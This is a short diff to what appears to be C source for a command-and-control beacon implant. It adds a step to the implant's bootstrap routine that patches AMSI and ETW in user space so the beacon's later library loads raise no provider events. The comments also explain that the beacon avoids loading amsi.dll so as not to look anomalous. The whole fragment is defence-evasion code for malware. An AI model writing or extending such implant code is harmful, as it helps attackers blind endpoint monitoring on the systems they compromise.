@@ -303,6 +303,18 @@ FUNC PNAX_INSTANCE NaxBootstrap( VOID ) {
     }
     NaxDbgx( Nax, "beacon private heap: %p", Nax->Heap );
 
+#if NAX_ETW_PATCH
+    /* P3: AMSI/ETW userland patches - run before the beacon's own library
+     * loads, so subsequent LoadLibraryW calls emit no userland provider
+     * events. Lane-gated (defender lane only; see src_beacon/Makefile).
+     * amsi.dll is only patched when already loaded - the beacon NEVER
+     * LoadLibrarys amsi (that load itself would be the anomaly). */
+    {
+        UINT32 patched = NaxEtwAmsiPatch( Nax );
+        NaxDbgx( Nax, "P3 patches: %u", patched );
+    }
+#endif
+
     HMODULE hKB = NaxGetModule( H_KERNELBASE_DLL );
     if ( hKB )
         Nax->Kernelbase.SetProcessValidCallTargets = (PVOID)NaxGetProc( hKB, H_SETPROCESSVALIDCALLTARGETS );
